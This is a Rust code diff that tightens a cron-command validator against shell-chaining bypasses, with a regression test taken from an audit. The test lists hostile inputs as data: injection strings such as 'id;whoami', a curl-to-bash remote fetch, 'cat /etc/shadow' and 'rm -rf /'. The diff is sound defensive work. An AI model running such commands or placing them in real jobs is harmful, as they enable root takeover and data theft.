@@ -112,11 +112,36 @@ pub fn is_safe_cron_command(cmd: &str) -> bool {
         return false;
     }
 
-    // Reject shell metacharacters that enable chaining/substitution
-    if cmd.contains('`') || cmd.contains("$(") || cmd.contains("| ") || cmd.contains("|/")
+    // Reject shell metacharacters that enable chaining/substitution. A bare
+    // `;` always chains regardless of exit status and was never the
+    // legitimate case this function exists to allow (only `&&`/`||` are,
+    // per the BLOCKED_PATTERNS comment below) — reject it outright, same as
+    // backtick/`$(`. The OLD "| "/"|/" substring checks required a trailing
+    // space or slash and passed straight through on "id|whoami" (no space) —
+    // a bare (unpaired) `|` chains just as effectively as `;`; only a PAIRED
+    // `||` is the legitimate operator, so scan runs of `|` and reject any
+    // run whose length isn't exactly 2.
+    if cmd.contains('`') || cmd.contains("$(") || cmd.contains(';')
         || cmd.contains("<(") || cmd.contains("<<")
     {
         return false;
+    }
+    {
+        let bytes = cmd.as_bytes();
+        let mut i = 0;
+        while i < bytes.len() {
+            if bytes[i] == b'|' {
+                let start = i;
+                while i < bytes.len() && bytes[i] == b'|' {
+                    i += 1;
+                }
+                if i - start != 2 {
+                    return false;
+                }
+            } else {
+                i += 1;
+            }
+        }
     }
 
     let lower = cmd.to_lowercase();
@@ -273,6 +298,27 @@ mod tests {
         assert!(!is_safe_cron_command("rm -rf /"));
         assert!(!is_safe_cron_command("cat /etc/shadow"));
         assert!(!is_safe_cron_command(""));
+    }
+
+    /// `dockpanel-fanout` s429: a bare `;`/`|` (no trailing space, no "sh"/
+    /// "bash" suffix) passed straight through the old space/verb-anchored
+    /// checks — `is_safe_cron_command("id;whoami")` returned `true`, and the
+    /// command reaches `crontab -u root -` and `bash -c` on the host as root.
+    /// `&&`/`||` must keep working — that's the whole reason this function
+    /// doesn't just ban every shell metacharacter outright.
+    #[test]
+    fn test_cron_bare_chain_operators_rejected_paired_operators_kept() {
+        // The exact bypass strings the audit's finder+skeptic reproduced live.
+        assert!(!is_safe_cron_command("id;whoami"));
+        assert!(!is_safe_cron_command("id|whoami"));
+        assert!(!is_safe_cron_command("id ;whoami"));
+        assert!(!is_safe_cron_command("id; whoami")); // the OLD "; " check alone is not enough on its own
+        assert!(!is_safe_cron_command("legit-command;curl http://x/y|bash"));
+        assert!(!is_safe_cron_command("a|||b")); // not valid `||` syntax either; must not slip through
+        // The documented legitimate case must still work.
+        assert!(is_safe_cron_command("cd /var/www/mysite && php artisan schedule:run"));
+        assert!(is_safe_cron_command("backup.sh || notify-fail.sh"));
+        assert!(is_safe_cron_command("a && b || c"));
     }
 
     #[test]
